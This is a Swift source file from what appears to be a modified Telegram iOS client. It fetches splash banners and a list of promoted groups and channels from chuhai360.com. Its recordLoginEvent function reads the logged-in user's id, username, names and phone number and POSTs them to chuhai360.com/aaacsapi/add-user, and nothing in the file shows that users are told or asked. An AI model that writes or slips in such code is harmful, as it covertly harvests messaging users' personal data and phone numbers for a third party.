import Foundation
import SwiftSignalKit
import MtProtoKit

public class BizManager {

    // Signal版
    // 如何使用
    // ProxyManager.fetchProxyServers().start(next: { proxyServers in
    //     // Handle proxy servers
    //     DispatchQueue.global(qos: .background).async {
    //         // code to be executed asynchronously
    //         let encoder = JSONEncoder()
    //         if let encodedProxyServers = try? encoder.encode(proxyServers) {
    //             UserDefaults.standard.set(encodedProxyServers, forKey: "proxyServers")
    //         }
    //     }
    // }, error: { error in
    //     // Handle error
    //     print(error)
    // })

    // fetch banner and save to UserDefaults
    public static func fetchAndSaveSplashScreen() -> Signal<Bool, Error> {
        return Signal { subscriber in
            let url = URL(string: "https://chuhai360.com/aaacsapi/banner")!
            var request = URLRequest(url: url, cachePolicy: URLRequest.CachePolicy.reloadIgnoringLocalCacheData, timeoutInterval: Double.infinity)
            let headers = ["Content-Type": "application/json"]
            request.allHTTPHeaderFields = headers
            request.httpMethod = "GET"
            let task = URLSession.shared.dataTask(with: request) { data, response, error in
                if let error = error {
                    subscriber.putError(error)
                    return
                }

                guard let httpResponse = response as? HTTPURLResponse else {
                    subscriber.putCompletion()
                    return
                }

                guard (200...299).contains(httpResponse.statusCode) else {
                    // Handle server error
                    subscriber.putCompletion()
                    return
                }

                guard let data = data else {
                    subscriber.putCompletion()
                    return
                }

                UserDefaults.standard.set(data, forKey: "splashImage")
                subscriber.putNext(true)
                subscriber.putCompletion()
            }

            task.resume()

            return ActionDisposable {
                task.cancel()
            }
        }
    }

    // read image data from UserDefaults
    public static func readSplashImage() -> Signal<[SplashImageElement], Error> {
        return Signal { subscriber in
            if let data = UserDefaults.standard.data(forKey: "splashImage") {
                do {
                    let decoder = JSONDecoder()
                    let splashImage = try decoder.decode(SplashImage.self, from: data)
                    subscriber.putNext(splashImage)
                    subscriber.putCompletion()
                } catch {
                    print("json decode error")
                    debugPrint(error.localizedDescription)
                    subscriber.putError(error)
                }
            } else {
                let err = NSError(domain: "NO_SPLASH_IMAGE", code: 500)
                subscriber.putError(err)
            }

            return ActionDisposable { }
        }
    }

    // fetch predefined groups and channels
    public static func fetchGroupsAndChannels() -> Signal<GroupsAndChannels, Error> {
        return Signal { subscriber in
            let url = URL(string: "https://chuhai360.com/aaacsapi/groups_and_channels")!
            var request = URLRequest(url: url, cachePolicy: URLRequest.CachePolicy.reloadIgnoringLocalCacheData, timeoutInterval: Double.infinity)
            let headers = ["Content-Type": "application/json"]
            request.allHTTPHeaderFields = headers
            request.httpMethod = "GET"
            let task = URLSession.shared.dataTask(with: request) { data, response, error in
                if let error = error {
                    subscriber.putError(error)
                    return
                }

                guard let httpResponse = response as? HTTPURLResponse else {
                    subscriber.putCompletion()
                    return
                }

                guard (200...299).contains(httpResponse.statusCode) else {
                    // Handle server error
                    subscriber.putCompletion()
                    return
                }

                guard let data = data else {
                    subscriber.putCompletion()
                    return
                }

                let result = try? JSONDecoder().decode(GroupsAndChannels.self, from: data)
                // UserDefaults.standard.set(data, forKey: "splashImage")
                subscriber.putNext(result!)
                subscriber.putCompletion()
            }

            task.resume()

            return ActionDisposable {
                task.cancel()
            }
        }
    }


    public static func recordLoginEvent(user: TelegramUser) {
        let date = Date()
        let df = DateFormatter()
        df.dateFormat = "yyyy-MM-dd HH:mm:ss"
        let loginedAt = df.string(from: date)
        
        let username = user.username ?? ""
        let firstName = user.firstName ?? ""
        let lastName = user.lastName ?? ""
        // let photo = user.photo ?? ""
        let photo = ""
        let phone = user.phone ?? ""

        let loginEvent = UserInfo(id: user.id.toInt64(), username: username, firstName: firstName, lastName: lastName, photo: photo, phone: phone,loginedAt: loginedAt)
        do {
            var postData: Data
            let encoder = JSONEncoder()
            if let jsonData = try? encoder.encode(loginEvent) {
                postData = jsonData
            }else {
                print("ERROR")
                return
            }
            let url = "https://chuhai360.com/aaacsapi/add-user"
            // let url = "https://enqefupim3x1e.x.pipedream.net/"
            var request = URLRequest(url: URL(string: url)!, timeoutInterval: Double.infinity)
            let headers = ["Content-Type": "application/json"]
            request.httpMethod = "POST"
            request.allHTTPHeaderFields = headers
            request.httpBody = postData
            let task = URLSession.shared.dataTask(with: request) { data, response, error in
                if let _ = error {
                    // Handle HTTP request error
                    print("error=\\(error)")
                    return
                } else if let data = data {
                    // Handle HTTP request response
                    print(String(data: data, encoding: .utf8)!)
                } else {
                    // Handle unexpected error
                }
            }
            task.resume()
        }
    }
}

// This file was generated from JSON Schema using quicktype.io, do not modify it directly.
// To parse the JSON, add this file to your project and do:
//
//   let splashImage = try? JSONDecoder().decode(SplashImage.self, from: jsonData)

// MARK: - SplashImageElement
public struct SplashImageElement: Codable {
    let id: Int
    public let imageURL: String
    public let siteURL: String
    public let type: String

    enum CodingKeys: String, CodingKey {
        case id
        case imageURL = "imageUrl"
        case siteURL = "siteUrl"
        case type
    }
}

public typealias SplashImage = [SplashImageElement]



// This file was generated from JSON Schema using quicktype, do not modify it directly.
// To parse the JSON, add this file to your project and do:
//
//   let groupAndChannel = try? JSONDecoder().decode(GroupsAndChannels.self, from: jsonData)

// MARK: - GroupAndChannelElement
public struct GroupAndChannelElement: Codable {
    let id: Int
    let title: String
    public let siteURL: String
    public let peerID, chatType, description: String

    enum CodingKeys: String, CodingKey {
        case id, title
        case siteURL = "siteUrl"
        case peerID = "peerId"
        case chatType
        case description = "describe"
    }
}

public typealias GroupsAndChannels = [GroupAndChannelElement]
